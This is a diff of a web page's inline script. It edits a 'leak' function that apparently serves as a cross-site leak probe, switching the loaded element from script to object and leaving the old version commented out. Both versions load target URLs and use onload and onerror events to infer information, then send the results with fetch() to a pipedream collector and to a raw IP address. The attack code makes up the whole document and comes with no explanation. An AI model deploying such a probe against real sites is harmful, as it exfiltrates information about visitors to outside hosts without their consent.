@@ -25,8 +25,8 @@
     <script>
         const leak = async (url, id) => {
             return new Promise((r) => {
-                let s = document.createElement('script')
-                s.src = url
+                let s = document.createElement('object')
+                s.data = url
                 s.onload = (e) => {
                     console.log('Onload event triggered at ' + url);
                     fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${url}`)
@@ -40,9 +40,29 @@
                     e.target.remove()
                     return r(1)
                 }
-                document.head.appendChild(s)
+                document.body.appendChild(s)
             })
         }
+        // const leak = async (url, id) => {
+        //     return new Promise((r) => {
+        //         let s = document.createElement('script')
+        //         s.src = url
+        //         s.onload = (e) => {
+        //             console.log('Onload event triggered at ' + url);
+        //             fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${url}`)
+        //             fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${s.textContent}`)
+        //             e.target.remove()
+        //             return r(0)
+        //         }
+        //         s.onerror = (e) => {
+        //             console.log('Error event triggered');
+        //             fetch(`http://91.173.39.199:25565/?error=${id}`)
+        //             e.target.remove()
+        //             return r(1)
+        //         }
+        //         document.head.appendChild(s)
+        //     })
+        // }
         // function probeError(url, id) {
         //     let script = document.createElement('script');
         //     script.src = url;
